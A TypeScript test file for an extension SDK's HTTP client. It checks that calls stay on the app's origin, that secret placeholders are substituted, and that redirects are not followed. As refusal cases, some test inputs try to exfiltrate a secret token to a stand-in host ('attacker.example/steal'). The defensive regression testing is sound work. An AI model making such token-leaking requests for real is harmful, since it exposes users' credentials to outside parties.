import { test, expect } from "bun:test";
import { createHttpClient, type ExtensionOperation, type ExtensionContext } from "./index";

test("an operation binding is plain data the daemon can run", () => {
  const op: ExtensionOperation<{ name: string }> = {
    name: "complete_wizard",
    label: "Complete setup wizard",
    description: "Finish first-run setup.",
    parameters: {},
    bind: (args) => ({
      kind: "http_mutation",
      goal: `complete setup for ${args.name}`,
      method: "POST",
      url: "http://127.0.0.1:8096/Startup/Complete",
      verifyUrl: "http://127.0.0.1:8096/System/Info/Public",
      verifyExpect: '"StartupWizardCompleted":true',
    }),
  };
  const bound = op.bind({ name: "jellyfin" });
  expect(bound.kind).toBe("http_mutation");
  expect(JSON.parse(JSON.stringify(bound))).toEqual(bound); // serialisable - it crosses the host RPC
  const ctxShape: (keyof ExtensionContext)[] = ["http", "browser", "secrets", "exec", "readFile"];
  expect(ctxShape.length).toBe(5);
});

// The client carries the app's real credential on every call; a path that leaves the app's origin
// must never be fetched (audit 2026-09-05 #1: an absolute or protocol-relative path resolved
// off-origin and took the token with it). Real server, no mocks.
test("createHttpClient stays on the app's origin, substitutes placeholders, and never follows a redirect", async () => {
  const seen: { path: string; auth: string | null }[] = [];
  const srv = Bun.serve({
    port: 0,
    fetch(req) {
      const url = new URL(req.url);
      seen.push({ path: url.pathname + url.search, auth: req.headers.get("x-api-key") });
      if (url.pathname === "/go") return Response.redirect("http://127.0.0.1:9/elsewhere", 302);
      return Response.json({ ok: true, path: url.pathname });
    },
  });
  try {
    const base = `http://127.0.0.1:${srv.port}`;
    // Secrets reach the host keyed by short name; a placeholder may use the short name or the full ref.
    const http = createHttpClient(base, { "X-Api-Key": "k-1" }, { token: "t-1" });
    expect((await http.get("/api/items/{{secret:extension.app.token}}", { query: { q: "x" } })).json<{ ok: boolean; path: string }>()).toEqual({ ok: true, path: "/api/items/t-1" });
    expect(seen[0]).toEqual({ path: "/api/items/t-1?q=x", auth: "k-1" });
    await expect(http.get("https://attacker.example/steal?k={{secret:token}}")).rejects.toThrow(/not this extension's app/);
    await expect(http.get("//attacker.example/steal")).rejects.toThrow(/not this extension's app/);
    await expect(http.get("/x", { headers: { X: "{{secret:nope}}" } })).rejects.toThrow(/no such secret/);
    expect(seen).toHaveLength(1); // none of the refused calls reached the network
    expect((await http.get("/go")).status).toBe(302); // reported, not followed
  } finally {
    srv.stop(true);
  }
});
